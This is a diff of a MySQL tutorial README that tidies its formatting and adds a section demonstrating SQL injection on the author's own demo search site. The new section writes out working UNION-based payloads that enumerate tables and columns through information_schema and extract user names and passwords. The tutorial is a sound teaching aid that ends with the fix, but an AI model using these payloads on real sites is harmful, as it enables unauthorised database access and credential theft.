@@ -1,9 +1,11 @@
-# MYSQL As ( Relational Database )
+# MYSQL  ( Relational Database )
 <img height="250px"  src="images/mysql2.png"/>
 <br><br>
 
 ### DBMS : Database Management System
-> the technology of storing and retrieving users’ data with utmost efficiency for example MYSQL, PostegreSQL, SqlLite, MariaDb, SAP, Oracle ... and so on
+    the technology of storing and retrieving users data 
+    with utmost efficiency for example MYSQL, PostegreSQL, 
+    SqlLite, MariaDb, SAP, Oracle ... and so on
 <br><br>
 1. [Storage_engines](#1-Storage_engines)
 2. [Data_Types](#2-data_types)
@@ -11,10 +13,11 @@
 4. [Relations](#4-Relations) 
 5. [Queries](#5-queries) 
 6. [Database Design](#6-Database-Design) 
+7. [SQL Injection](#7-SQL-Injection)
 
 
 
-
+<br>
 
 ## 1. Storage_engines :
 
@@ -73,7 +76,9 @@ SELECT title FROM items WHERE match(title) Against ("+watch -smart" IN BOOLEAN M
   * Decimal(5,2)..number is 5 length with 2 numbers after digit...used with math operation for perfect percetion.<br><br>
 
 
-   > unsigned  means don't allow negatives while signed allow  negative and positive (signed is the default) it can be put before any datatype
+        TINYINT unsigned 0 -> 255 while TINYINT signed -127 -> 127  
+         notice (signed is the default) 
+         it can be put after any numerical datatype
 
 
 * ### String:
@@ -162,7 +167,14 @@ Products Table
 
 
 ## 5. Queries:
-**create database**
+
+
+> For better experience,Do queries yourself in php_my_admin
+> you can download [users table](table/users.sql)
+
+<br> 
+
+**Create Database**
 
 ```SQL
 CREATE DATABASE db; 
@@ -170,7 +182,7 @@ CREATE DATABASE db;
 <br>
 
 
-**create Table**
+**Create Table**
 
 ```SQL
 /*  * on creating table you must create columns also otherwise it won't allow creating table
@@ -190,7 +202,7 @@ age TINYINT
 ```
 <br>
 
-**Updating table structure**
+**Updating table Structure**
 
 ```SQL
 /* adding column */
@@ -208,7 +220,7 @@ DROP email;
 ```
 <hr>
 
-[download users table](table/users.sql)
+Download  [users table](table/users.sql)
 
 | id  | first_name | last_name | age |
 | --- | ---------- | --------- | --- |
@@ -258,7 +270,7 @@ WHERE id = 7 OR id = 8 ;
 SELECT * FROM users;
 ```
 
-output 
+**Output** 
 
 | id  | first_name | last_name | age |
 | --- | ---------- | --------- | --- |
@@ -300,7 +312,7 @@ WHERE age>30
 ORDER BY age DESC
 LIMIT 2; 
 ```
-output
+**Output**
 
 | age | first_name |
 | --- | ---------- |
@@ -321,7 +333,7 @@ output
 SELECT id,first_name AS name FROM users 
 WHERE age>=30 AND last_name LIKE 'm%';
 ```
-output
+**Output**
  
 | id  | name |
 | --- | ---- |
@@ -334,7 +346,7 @@ select u.id , u.first_name,u.age from users u
 Where u.age<30
 ORDER BY age DESC,first_name ASC;
 ```
-output
+**Output**
 
 | id  | first_name | age |
 | --- | ---------- | --- |
@@ -354,7 +366,7 @@ SELECT first_name FROM users
 UNION
 SELECT last_name FROM users;
 ```
-output
+**Output**
 
 | first_name |
 |------------|
@@ -381,7 +393,7 @@ SELECT
 GROUP_CONCAT(DISTINCT first_name ORDER BY id) AS first_name
 FROM users;
 ```
-output 
+**Output** 
 
 | first_name              |
 |-------------------------|
@@ -403,7 +415,7 @@ SEPARATOR "," ) AS full_info
 FROM users;
 
 ```
-output 
+**Output** 
 
 | full_info                                           |
 |-----------------------------------------------------|
@@ -434,7 +446,7 @@ GROUP BY name email
 HAVING COUNT(*)>1;
 ```
 
-output
+**Output**
 
 | name | email      | count_of |
 | ---- | ---------- | -------- |
@@ -536,3 +548,128 @@ the fix is to create another table for category Table and make a foreign key bet
   
   * normalize the database by finding relations between tables
 
+
+
+
+## 7. SQL Injection
+
+        sql injection is what attackers can use to get into your database 
+        and read all the sensitive data inside and cause catastrophic data breach
+
+> so lets see what mistakes developers do and how attacker can use this mistake
+
+<hr>
+
+**this is simple website created myself to search for products**
+
+<img src="images/sql_injection_1.png">
+<img src="images/sql_injection_2.png">
+
+```php
+/* attacker will think what query developer used to create this feautre */
+SELECT ? FROM ? WHERE ? like = '%$search_input%';
+
+
+/* attacker says fair enough now lets test for sql injection 
+so that our input would be "'-- " 
+*/
+ Lets make the query to be such
+SELECT ? FROM ? WHERE ? like = '%'--    %';
+
+/*
+-- is mysql commenting what comes after it
+so we altered the query and MYSQL server read it such
+SELECT ? FROM ? WHERE ? like = '%'
+*/
+```
+
+<img src="images/sql_injection_3.png">
+
+```php
+/* wow it got all the records inside product_name,
+apparently this site is vulnerable to sql injection
+attacker now says okay lets try to play a little and see queries get executed 
+input be "' UNION (SELECT 1 FROM dual)--   "
+
+dual is a table in mysql itself that display whatever you are trying 
+to display and its for test purpose
+SELECT "lorem ipsum" FROM dual .... will display lorem ipsum
+*/
+
+SELECT ? FROM ? WHERE ? like = '%' UNION (SELECT 1 FROM dual)--   %';
+```
+
+<img src="images/sql_injection_4.png">
+
+
+    attacker now says okay lets get db names and db tables 
+    but first let me introduct you to information_schema 
+    its a database mysql has in default and mysql uses it to track
+    all changes happens in mysql you can say it it the core of mysql
+
+    what concern us is two tables inside it 
+    information_schema.tables ... it is a record of db and associated tables
+    information_schema.columns... it is a record of db and associated tables and columns
+ 
+
+    i executed query "SELECT * FROM information_schema.tables" on my phpMyAdmin to get insights about information_schema.tables
+    you can see here that i have db name called blog which have tables categories,	
+    migrations,password_resets,posts,users
+
+<img src="images/sql_injection_5.png">
+
+    i executed query "SELECT * FROM information_schema.columns" on my phpMyAdmin also
+    its a bit messy but it have the columns names and associated table name and associated db
+
+
+<img src="images/sql_injection_6.png">
+
+> sorry for interrupting let's continue
+
+```php
+/* 
+getting all tables inside databases and search for what we need which would be for example users
+*/
+
+SELECT ? FROM ? WHERE ? like = '%' UNION (SELECT table_name FROM information_schema.tables)--   %';
+```
+
+
+<img src="images/sql_injection_7.png">
+
+```php
+/* 
+getting all columns inside table
+*/
+
+SELECT ? FROM ? WHERE ? like = '%' UNION (SELECT column_name FROM information_schema.columns WHERE table_name="users")--   %';
+```
+
+<img src="images/sql_injection_8.png">
+
+```php
+/*
+we knew table is users and columns are id,user_name,user_password 
+now lets get all the user names and passwords
+*/
+
+SELECT ? FROM ? WHERE ? like = '%' UNION SELECT CONCAT(id," ",user_name," ",user_password) FROM users--   %';
+```
+<img src="images/sql_injection_9.png">
+
+<hr>
+
+so what was the bug in the code lead to this catastrophic exploit
+the bug pretty simple and many developers forget to fix it
+he pluged the input into mysql query without escaping string or any other defense mechanisms
+
+<img src="images/sql_injection_10.png">
+
+
+a simple fix is like this 
+
+
+<img src="images/sql_injection_11.png">
+
+        so please be careful when you are plugging any input to mysql query, 
+        its enough to forget escaping input only once and attacker can reach all your databases.
